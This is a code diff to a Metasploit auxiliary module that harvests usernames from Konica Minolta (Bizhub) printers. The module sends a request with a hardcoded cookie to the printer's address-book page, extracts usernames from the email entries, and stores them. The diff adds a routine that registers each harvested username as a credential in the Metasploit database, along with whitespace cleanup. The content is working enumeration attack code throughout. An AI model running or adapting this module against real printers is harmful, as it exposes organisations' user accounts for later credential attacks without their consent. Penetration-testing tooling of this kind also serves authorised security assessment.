@@ -39,10 +39,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
 
-    #need to update for SSL enabled printers. In due time.     
+    #need to update for SSL enabled printers. In due time.
     print_status("Attempting to enumerate usernames from: #{rhost}")
 
-   
+
     usernames = get_usernames
     if usernames.nil?
       print_status("No usernames found")
@@ -62,20 +62,24 @@ class Metasploit3 < Msf::Auxiliary
       loot_desc     = "Bizzhub Username Harvester"
       p = store_loot(loot_name, loot_type, datastore['RHOST'], users , loot_filename, loot_desc)
       print_status("Credentials saved in: #{p.to_s}")
+
+      usernames.each do | user |
+         register_creds('Konica-HTTP', rhost, '80', user, "")
+      end
   end
 
 
   def get_usernames
     usernames = []
-    #while pages >= 0 do 
+    #while pages >= 0 do
     #  user_record_page = "#{@uri_page}&startRecord=#{pages}"
-      
+
     get_cookie_url = "http://#{rhost}/wcd/index.html?access=ABR_ABR"
 
     headers = {
       'Cookie' => "ID=f0c6eb7abd5ee73bc9fd842913501cc4; bv=Firefox/28.0; uatype=NN; selno=Auto; lang=En; favmode=false; vm=Html; usr=C_ABR; param="
     }
-   
+
     res = send_request_cgi(
          {
             'uri'       => get_cookie_url,
@@ -101,18 +105,47 @@ class Metasploit3 < Msf::Auxiliary
           }, datastore['TIMEOUT'].to_i)
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
         print_error("#{rhost}:#{rport} - Connection failed.")
-        return 
+        return
       end
 
       if res == nil
         print_error("#{rhost}:#{rport} - Connection failed.")
-        return 
+        return
       end
-    
+
       xml_doc = ::Nokogiri::XML(res.body)
       xml_doc.xpath("//To").each do | val|
         usernames << val.text.split('@')[0]
       end
       return usernames.uniq
+  end
+
+  def register_creds (service_name, remote_host, remote_port, username, password)
+    credential_data = {
+       origin_type: :service,
+       module_fullname: self.fullname,
+       workspace_id: myworkspace.id,
+       username: username,
+       }
+
+    service_data = {
+      address: remote_host,
+      port: remote_port,
+      service_name: service_name,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+      }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      workspace_id: myworkspace_id
+    }
+
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
   end
 end
